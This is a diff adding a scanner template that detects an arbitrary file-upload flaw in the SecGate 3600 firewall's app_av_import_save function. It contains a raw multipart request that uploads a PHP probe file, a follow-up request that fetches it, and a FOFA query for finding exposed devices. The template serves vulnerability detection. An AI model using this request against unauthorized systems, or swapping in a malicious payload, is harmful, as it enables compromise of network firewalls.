@@ -1,0 +1,33 @@
+http:
+- matchers:
+  - dsl:
+    - status_code_2 == 200 && contains(body,'9996535e07258a7bbfd8b132435c5962') &&
+      contains(header,'text/html')
+    name: filename
+    type: dsl
+  payloads:
+    filename:
+    - qwqer21.php
+  raw:
+  - "POST / HTTP/1.1\nHost: \nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc\n\
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15\
+    \ (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\n\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\n\
+    Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n10000000\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\n\
+    Content-Disposition: form-data; name=\"reqfile\";filename=\"{{filename}}\"\nContent-Type:\
+    \ text/plain\n\n<?php echo(md5(1235));unlink(__FILE__);?>\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\n\
+    Content-Disposition: form-data; name=\"submit_post\"\n\napp_av_import_save\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--\n"
+  - "GET /attachements/{{filename}} HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Macintosh;\
+    \ Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3\
+    \ Safari/605.1.15      \n"
+id: ws-fw-app_av_import_save-fileupload
+info:
+  author: yy
+  description: "\u7F51\u795E\u9632\u706B\u5899app_av_import_save\u5B58\u5728\u6587\
+    \u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u3002"
+  metadata:
+    fofa-qeury: "title=\"\u7F51\u795ESecGate 3600\u9632\u706B\u5899\""
+    max-request: 2
+    veified: true
+  name: ws-fw-app_av_import_save-fileupload
+  severity: high
+  tags: ws,fileupload
